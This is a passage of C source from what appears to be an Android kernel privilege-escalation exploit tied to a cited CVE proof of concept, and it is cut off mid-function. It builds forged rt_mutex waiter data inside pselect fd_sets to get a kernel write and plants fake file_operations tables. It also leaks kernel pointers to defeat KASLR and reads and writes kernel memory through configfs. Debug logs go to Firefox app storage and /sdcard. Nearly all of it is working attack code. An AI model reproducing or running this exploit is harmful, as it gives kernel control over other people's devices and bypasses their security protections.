#include "common.h"
void run_main_route_threads(void);
#include <stdarg.h>

#ifndef PSELECT_CFI_ROUTE_ATTEMPTS
#define PSELECT_CFI_ROUTE_ATTEMPTS 24
#endif
#ifndef DIRECT_WRITE_ROUTE_ONLY_PROBE
#define DIRECT_WRITE_ROUTE_ONLY_PROBE 0
#endif
#ifndef ROUTE_NO_PSELECT_PROBE
#define ROUTE_NO_PSELECT_PROBE 0
#endif
#ifndef ROUTE_PSELECT_NULLSETS_PROBE
#define ROUTE_PSELECT_NULLSETS_PROBE 0
#endif
#ifndef ROUTE_PSELECT_EMPTYIN_PROBE
#define ROUTE_PSELECT_EMPTYIN_PROBE 0
#endif
#ifndef ROUTE_PSELECT_ONEBIT_PROBE
#define ROUTE_PSELECT_ONEBIT_PROBE 0
#endif
#ifndef ROUTE_PSELECT_THREESETS_PROBE
#define ROUTE_PSELECT_THREESETS_PROBE 0
#endif
#ifndef ROUTE_CONSUMER_ONLY_PROBE
#define ROUTE_CONSUMER_ONLY_PROBE 0
#endif
#ifndef ROUTE_NULLSETS_CONSUMER_PROBE
#define ROUTE_NULLSETS_CONSUMER_PROBE 0
#endif
#ifndef ROUTE_ONEBIT_CONSUMER_PROBE
#define ROUTE_ONEBIT_CONSUMER_PROBE 0
#endif
#ifndef ROUTE_THREESETS_CONSUMER_PROBE
#define ROUTE_THREESETS_CONSUMER_PROBE 0
#endif
#ifndef CFI_CONFIGFS_ONLY_DIAG
#define CFI_CONFIGFS_ONLY_DIAG 0
#endif
#ifndef LEGACY_CONFIGFS_CRED_STAGE
/* The old stage wrote a partial, synthetic cred object after the verified
 * pipe/root path.  Keep it available for historical comparison, but never
 * enable it in the normal violin route. */
#define LEGACY_CONFIGFS_CRED_STAGE 0
#endif

uint64_t pselect_user_lock[PSELECT_USER_LOCK_WORDS];
atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static void fops_route_log(const char *fmt, ...) {
  char buf[512];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  if (n < 0) {
    return;
  }
  buf[sizeof(buf) - 1] = '\0';
  const char *paths[] = {
    "/data/data/org.mozilla.firefox/files/crash.txt",
    "/sdcard/Download/crash.txt",
  };
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
    int fd = open(paths[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) {
      continue;
    }
    size_t len = strlen(buf);
    size_t off = 0;
    while (off < len) {
      ssize_t wr = write(fd, buf + off, len - off);
      if (wr <= 0) {
        break;
      }
      off += (size_t)wr;
    }
    fsync(fd);
    close(fd);
  }
}

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  if (pselect_custom_write_enabled()) {
    (void)write_fd;
    int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
    if (high_read < 0) {
      pr_warning("pselect F_DUPFD custom read errno=%d\n", errno);
      return;
    }
    for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
      if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
        dup2(high_read, fd);
      }
    }
    close(high_read);
    dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
    FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
    return;
  }

  /* violin fix: 用 read_fd (pipe 读端/timerfd) 代替 write_fd (pipe 写端)
   * pipe 写端永远 ready → pselect 立即返回 → consumer 没时间 fire
   * pipe 读端在 pipe 空时不 ready → pselect 阻塞 */
  int high_write = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {  /* 跳过 fd 0-2 */
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

#if DIRECT_WRITE_ROUTE_ONLY_PROBE
  FD_SET(PSELECT_ROUTE_NFDS - 1, in);
  return;
#endif

  if (pselect_custom_write_enabled()) {
    struct pselect_waiter_word {
      int word;
      uint64_t value;
    } words[] = {
      {2, pselect_write_value()},
      {3, 0},
      {4, pselect_write_target()},
      {5, pselect_write_shape() == 1 && pselect_write_target() >= 8
              ? pselect_write_target() - 8
              : pselect_write_value()},
      {6, pselect_write_shape() == 1 ? pselect_write_value() : 0},
      {7, pselect_write_shape() == 1 ? 0 : pselect_write_target()},
      /* With PSELECT_WAITER_WORD_SHIFT=0, word 5 starts at
       * waiter.pi_tree.entry (+0x28).  Keep the remaining values aligned
       * with the verified rt_mutex_waiter layout. */
      {8, FAKE_WAITER_PRIO},
      {9, 0},
      {10, fake_task},
      {11, fake_lock},
      {12, 0},
      {13, 0},
    };
    int bits_per_word = (int)(8 * sizeof(unsigned long));
    int words_per_set = (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      int global_word = PSELECT_WAITER_WORD_SHIFT + words[i].word;
      int set_idx = global_word / words_per_set;
      int word_idx = global_word % words_per_set;
      if (set_idx == 0) {
        fdset_put_word(in, word_idx, words[i].value);
      } else if (set_idx == 1) {
        fdset_put_word(out, word_idx, words[i].value);
      } else if (set_idx == 2) {
        fdset_put_word(ex, word_idx, words[i].value);
      }
    }
    return;
  }

  /* POC-pad7U 方案: pi_tree 做 rb_insert 写入
   * 不需要 HI32 掩码 — open_selected_fds 已经用 dup2 替换了所有被设置的 fd */
  fdset_put_word(in, 0, 0);  /* tree fields */
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0x42424242);  /* prio: 非零值，避免 rt_waiter_node_equal 匹配 */
  fdset_put_word(in, 4, 0x43434343);  /* deadline: 非零值，避免匹配 */

  /* pi_tree: __rb_parent_color = target-8, rb_left = value */
  fdset_put_word(out, 0, data_addr(ASHMEM_MISC) + 0x10 - 0x08);
  fdset_put_word(out, 1, 0);
  fdset_put_word(out, 2, fake_fops);

  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);  /* wake_state=3 */
  fdset_put_word(ex, 3, 0);
}

void do_pselect_fake_lock_route(void) {
#if ROUTE_THREESETS_CONSUMER_PROBE
  int pipefd[2];
  fd_set in, out, ex;
  struct timespec timeout = {.tv_sec = 1, .tv_nsec = 0};
  SYSCHK(pipe(pipefd));
  int timerfd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  int block_fd = timerfd >= 0 ? timerfd : pipefd[0];
  int probe_fd = PSELECT_ROUTE_NFDS - 1;
  if (dup2(block_fd, probe_fd) < 0) {
    int saved_errno = errno;
    if (timerfd >= 0) close(timerfd);
    close(pipefd[0]);
    close(pipefd[1]);
    fops_route_log("ROUTE_THREESETS_CONSUMER_DUP_FAIL: errno=%d\n", saved_errno);
    cfi_last_step = 31;
    cfi_last_errno = saved_errno;
    return;
  }
  FD_ZERO(&in);
  FD_ZERO(&out);
  FD_ZERO(&ex);
  FD_SET(probe_fd, &in);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&main_route_delay_usec, 0);
  fops_route_log("ROUTE_THREESETS_CONSUMER_ENTER: waiter_tid=%d in4=%016llx out4=%016llx ex4=%016llx\n",
                 atomic_load(&waiter_tid),
                 (unsigned long long)fdset_get_word(&in, 4),
                 (unsigned long long)fdset_get_word(&out, 4),
                 (unsigned long long)fdset_get_word(&ex, 4));
  atomic_store(&punch_consume_go, 1);
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
  int saved_errno = errno;
  atomic_store(&punch_consume_go, 0);
  cfi_last_step = ret == 0 ? 0 : 33;
  cfi_last_errno = saved_errno;
  fops_route_log("ROUTE_THREESETS_CONSUMER_RET: ret=%d errno=%d calls=%d success=%d in4=%016llx out4=%016llx ex4=%016llx\n",
                 ret, saved_errno, atomic_load(&consumer_calls),
                 atomic_load(&consumer_success),
                 (unsigned long long)fdset_get_word(&in, 4),
                 (unsigned long long)fdset_get_word(&out, 4),
                 (unsigned long long)fdset_get_word(&ex, 4));
  close(probe_fd);
  if (timerfd >= 0) close(timerfd);
  close(pipefd[0]);
  close(pipefd[1]);
  return;
#endif
#if ROUTE_ONEBIT_CONSUMER_PROBE
  int pipefd[2];
  fd_set in;
  struct timespec timeout = {.tv_sec = 1, .tv_nsec = 0};
  SYSCHK(pipe(pipefd));
  int timerfd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  int block_fd = timerfd >= 0 ? timerfd : pipefd[0];
  int probe_fd = PSELECT_ROUTE_NFDS - 1;
  if (dup2(block_fd, probe_fd) < 0) {
    int saved_errno = errno;
    if (timerfd >= 0) close(timerfd);
    close(pipefd[0]);
    close(pipefd[1]);
    fops_route_log("ROUTE_ONEBIT_CONSUMER_DUP_FAIL: errno=%d\n", saved_errno);
    cfi_last_step = 31;
    cfi_last_errno = saved_errno;
    return;
  }
  FD_ZERO(&in);
  FD_SET(probe_fd, &in);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&main_route_delay_usec, 0);
  fops_route_log("ROUTE_ONEBIT_CONSUMER_ENTER: waiter_tid=%d fd=%d word4=%016llx\n",
                 atomic_load(&waiter_tid), probe_fd,
                 (unsigned long long)fdset_get_word(&in, 4));
  atomic_store(&punch_consume_go, 1);
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, NULL, NULL, &timeout, NULL);
  int saved_errno = errno;
  atomic_store(&punch_consume_go, 0);
  cfi_last_step = ret == 0 ? 0 : 33;
  cfi_last_errno = saved_errno;
  fops_route_log("ROUTE_ONEBIT_CONSUMER_RET: ret=%d errno=%d calls=%d success=%d word4=%016llx\n",
                 ret, saved_errno, atomic_load(&consumer_calls),
                 atomic_load(&consumer_success),
                 (unsigned long long)fdset_get_word(&in, 4));
  close(probe_fd);
  if (timerfd >= 0) close(timerfd);
  close(pipefd[0]);
  close(pipefd[1]);
  return;
#endif
#if ROUTE_NULLSETS_CONSUMER_PROBE
  struct timespec timeout = {.tv_sec = 1, .tv_nsec = 0};
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&main_route_delay_usec, 0);
  fops_route_log("ROUTE_NULLSETS_CONSUMER_ENTER: waiter_tid=%d\n",
                 atomic_load(&waiter_tid));
  atomic_store(&punch_consume_go, 1);
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, NULL, NULL, NULL, &timeout, NULL);
  int saved_errno = errno;
  atomic_store(&punch_consume_go, 0);
  cfi_last_step = ret == 0 ? 0 : 33;
  cfi_last_errno = saved_errno;
  fops_route_log("ROUTE_NULLSETS_CONSUMER_RET: ret=%d errno=%d calls=%d success=%d\n",
                 ret, saved_errno, atomic_load(&consumer_calls),
                 atomic_load(&consumer_success));
  return;
#endif
#if ROUTE_CONSUMER_ONLY_PROBE
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&main_route_delay_usec, 0);
  fops_route_log("ROUTE_CONSUMER_ONLY_ENTER: waiter_tid=%d\n",
                 atomic_load(&waiter_tid));
  atomic_store(&punch_consume_go, 1);
  usleep(150000);
  atomic_store(&punch_consume_go, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
  fops_route_log("ROUTE_CONSUMER_ONLY_RET: calls=%d success=%d\n",
                 atomic_load(&consumer_calls), atomic_load(&consumer_success));
  return;
#endif
#if ROUTE_PSELECT_THREESETS_PROBE
  int pipefd[2];
  fd_set in, out, ex;
  struct timespec timeout = {.tv_sec = 1, .tv_nsec = 0};
  SYSCHK(pipe(pipefd));
  int timerfd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  int block_fd = timerfd >= 0 ? timerfd : pipefd[0];
  int probe_fd = PSELECT_ROUTE_NFDS - 1;
  if (dup2(block_fd, probe_fd) < 0) {
    int saved_errno = errno;
    if (timerfd >= 0) close(timerfd);
    close(pipefd[0]);
    close(pipefd[1]);
    fops_route_log("ROUTE_THREESETS_DUP_FAIL: errno=%d\n", saved_errno);
    cfi_last_step = 31;
    cfi_last_errno = saved_errno;
    return;
  }
  FD_ZERO(&in);
  FD_ZERO(&out);
  FD_ZERO(&ex);
  FD_SET(probe_fd, &in);
  fops_route_log("ROUTE_THREESETS_ENTER: waiter_tid=%d in4=%016llx out4=%016llx ex4=%016llx\n",
                 atomic_load(&waiter_tid),
                 (unsigned long long)fdset_get_word(&in, 4),
                 (unsigned long long)fdset_get_word(&out, 4),
                 (unsigned long long)fdset_get_word(&ex, 4));
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
  int saved_errno = errno;
  cfi_last_step = ret == 0 ? 0 : 33;
  cfi_last_errno = saved_errno;
  fops_route_log("ROUTE_THREESETS_RET: ret=%d errno=%d in4=%016llx out4=%016llx ex4=%016llx\n",
                 ret, saved_errno, (unsigned long long)fdset_get_word(&in, 4),
                 (unsigned long long)fdset_get_word(&out, 4),
                 (unsigned long long)fdset_get_word(&ex, 4));
  close(probe_fd);
  if (timerfd >= 0) close(timerfd);
  close(pipefd[0]);
  close(pipefd[1]);
  return;
#endif
#if ROUTE_PSELECT_ONEBIT_PROBE
  int pipefd[2];
  fd_set in;
  struct timespec timeout = {.tv_sec = 1, .tv_nsec = 0};
  SYSCHK(pipe(pipefd));
  int timerfd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  int block_fd = timerfd >= 0 ? timerfd : pipefd[0];
  int probe_fd = PSELECT_ROUTE_NFDS - 1;
  if (dup2(block_fd, probe_fd) < 0) {
    int saved_errno = errno;
    if (timerfd >= 0) close(timerfd);
    close(pipefd[0]);
    close(pipefd[1]);
    fops_route_log("ROUTE_ONEBIT_DUP_FAIL: errno=%d\n", saved_errno);
    cfi_last_step = 31;
    cfi_last_errno = saved_errno;
    return;
  }
  FD_ZERO(&in);
  FD_SET(probe_fd, &in);
  fops_route_log("ROUTE_ONEBIT_ENTER: waiter_tid=%d fd=%d word4=%016llx\n",
                 atomic_load(&waiter_tid), probe_fd,
                 (unsigned long long)fdset_get_word(&in, 4));
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, NULL, NULL, &timeout, NULL);
  int saved_errno = errno;
  cfi_last_step = ret == 0 ? 0 : 33;
  cfi_last_errno = saved_errno;
  fops_route_log("ROUTE_ONEBIT_RET: ret=%d errno=%d word4=%016llx\n", ret,
                 saved_errno, (unsigned long long)fdset_get_word(&in, 4));
  close(probe_fd);
  if (timerfd >= 0) close(timerfd);
  close(pipefd[0]);
  close(pipefd[1]);
  return;
#endif
#if ROUTE_PSELECT_EMPTYIN_PROBE
  fd_set in;
  struct timespec timeout = {.tv_sec = 1, .tv_nsec = 0};
  FD_ZERO(&in);
  fops_route_log("ROUTE_EMPTYIN_ENTER: waiter_tid=%d word0=%016llx\n",
                 atomic_load(&waiter_tid),
                 (unsigned long long)fdset_get_word(&in, 0));
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, NULL, NULL, &timeout, NULL);
  int saved_errno = errno;
  cfi_last_step = ret == 0 ? 0 : 33;
  cfi_last_errno = saved_errno;
  fops_route_log("ROUTE_EMPTYIN_RET: ret=%d errno=%d word0=%016llx\n", ret,
                 saved_errno, (unsigned long long)fdset_get_word(&in, 0));
  return;
#endif
#if ROUTE_PSELECT_NULLSETS_PROBE
  struct timespec timeout = {.tv_sec = 1, .tv_nsec = 0};
  fops_route_log("ROUTE_NULLSETS_ENTER: waiter_tid=%d\n",
                 atomic_load(&waiter_tid));
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, NULL, NULL, NULL, &timeout, NULL);
  int saved_errno = errno;
  cfi_last_step = ret == 0 ? 0 : 33;
  cfi_last_errno = saved_errno;
  fops_route_log("ROUTE_NULLSETS_RET: ret=%d errno=%d\n", ret, saved_errno);
  return;
#endif
#if ROUTE_NO_PSELECT_PROBE
  fops_route_log("ROUTE_NO_PSELECT_ENTER: waiter_tid=%d\n",
                 atomic_load(&waiter_tid));
  cfi_last_step = 0;
  cfi_last_errno = 0;
  return;
#endif

#if DIRECT_WRITE_ROUTE_ONLY_PROBE
{
  int calls = 0;
  int success = 0;
  int pipefd[2];
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    block_fd = pipefd[0];
    fops_route_log("ROUTE_ONLY_TIMERFD_FAIL: errno=%d using_pipe_read\n", errno);
  }
  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
  if (high_read < 0) {
    cfi_last_step = 31;
    cfi_last_errno = errno;
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_pselect_fdsets(&in, &out, &ex);
  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&main_route_delay_usec, 0);
  fops_route_log("ROUTE_ONLY_GO: waiter_tid=%d in_last=%d\n",
                 atomic_load(&waiter_tid),
                 FD_ISSET(PSELECT_ROUTE_NFDS - 1, &in));
  atomic_store(&punch_consume_go, 1);

  struct timespec timeout = {
    .tv_sec = 1,
    .tv_nsec = 0,
  };
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
  int saved_errno = errno;
  atomic_store(&punch_consume_go, 0);
  calls = atomic_load(&consumer_calls);
  success = atomic_load(&consumer_success);
  cfi_last_step = calls > 0 ? 0 : 33;
  cfi_last_errno = saved_errno;
  fops_route_log("ROUTE_ONLY_RET: ret=%d errno=%d calls=%d success=%d "
                 "waiter_tid=%d\n",
                 ret, saved_errno, calls, success, atomic_load(&waiter_tid));
  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
  return;
}
#endif

  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));

    /* Direct write 路径: pselect fd_set words 覆写 waiter 结构字段，
     * PI chain walk 时内核写入 value 到 target。
     * set_pselect_write 已在 main.c 中配置 target 和 value。 */
    fd_set in, out, ex;
    prepare_pselect_fdsets(&in, &out, &ex);

    int timerfd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (timerfd < 0) {
      close(pipefd[0]);
      close(pipefd[1]);
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_warning("pselect timerfd failed errno=%d\n", errno);
      break;
    }
    open_selected_fds(&in, &out, &ex, timerfd, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    fops_route_log("FOPSROUTE_GO: attempt=%d delay=%d waiter_tid=%d\n",
                   route_attempt, delay_usec, atomic_load(&waiter_tid));

    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
    int saved_errno = errno;

    /* 等 consumer 完成 */
    for (int w = 0; w < 30 && atomic_load(&punch_consume_go) != 0; w++) {
      usleep(10000);
    }
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    fops_route_log("FOPSROUTE_RET: attempt=%d ret=%d errno=%d calls=%d "
                   "success=%d delay=%d\n",
                   route_attempt, ret, saved_errno, calls, success,
                   delay_usec);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      fops_route_log("FOPSROUTE_CFI_DISPATCH: attempt=%d\n", route_attempt);
      int stage_ok = try_cfi_stage();
      fops_route_log("FOPSROUTE_CFI_RESULT: attempt=%d ok=%d step=%d errno=%d\n",
                     route_attempt, stage_ok, cfi_last_step, cfi_last_errno);
      if (stage_ok) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(pipefd[0]);
    close(pipefd[1]);
    close(timerfd);

    if (route_verified || cfi_dirty_seen || !route_signal) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

/*
 * Direct write 原语 — 来自 Linuxoid-cn CVE-2026-43499-Poc-Analysis
 *
 * 每次写入 fork 子进程:
 *   1. set_pselect_write(target, value, shape)
 *   2. prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE)
 *   3. prepare_skb_payload(page, PAGE_PAYLOAD_FOPS)
 *   4. run_main_route_threads()
 *
 * shape=0: 读取模式 (boot_id sidecar)
 * shape=1: 写入模式 (target-8=parent, value=right)
 */

#define DIRECT_WRITE_ATTEMPTS 3
#define DIRECT_WRITE_TIMEOUT_SEC 8

static uint64_t monotonic_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void kill_and_reap_group(pid_t child) {
  kill(-child, SIGKILL);
  int status;
  waitpid(child, &status, 0);
}

static int direct_pselect_write_once_internal(
    uintptr_t target, uintptr_t value, int shape, int idx,
    uintptr_t followup_target, int followup_idx) {
  if (shape < 0 || shape > 1) {
    errno = EINVAL;
    return 0;
  }

  pid_t expected_parent = getpid();
  pid_t child = fork();
  if (child < 0) {
    pr_warning("direct-w64[%d] fork failed errno=%d\n", idx, errno);
    return 0;
  }

  if (child == 0) {
    if (setpgid(0, 0) != 0) _exit(10);
    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 || getppid() != expected_parent)
      _exit(11);

    page_base = 0;
    fake_lock = 0;
    fake_w0 = 0;
    fake_task = 0;
    set_pselect_write(target, value, shape);

